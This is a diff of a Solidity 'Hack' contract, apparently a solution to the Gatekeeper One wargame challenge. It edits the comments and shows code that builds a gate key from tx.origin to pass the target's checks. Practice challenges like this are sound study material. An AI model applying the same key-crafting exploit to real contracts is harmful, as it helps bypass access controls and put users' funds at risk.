@@ -9,10 +9,14 @@ contract Hack {
     function enter(address _target, uint256 gas) external {
         IGateKeeperOne target = IGateKeeperOne(_target);
         // k = uint64(key)
-        // uint32(k) = uint16(k)
-        // uint32(k) != k
-        // uint32(k) == uint16(uint160(tx.origin))
+        // 1. uint32(k) = uint16(k)
+        // 2. uint32(k) != k
+        // 3. uint32(k) == uint16(uint160(tx.origin))
+
+        // 3. uint32(k) == uint16(uint160(tx.origin))
+        // 1. uint32(k) = uint16(k)
         uint16 k16 = uint16(uint160(tx.origin));
+        // 2. uint32(k) != k
         uint64 k64 = uint64(1 << 63) + uint64(k16);
 
         bytes8 key = bytes8(k64);
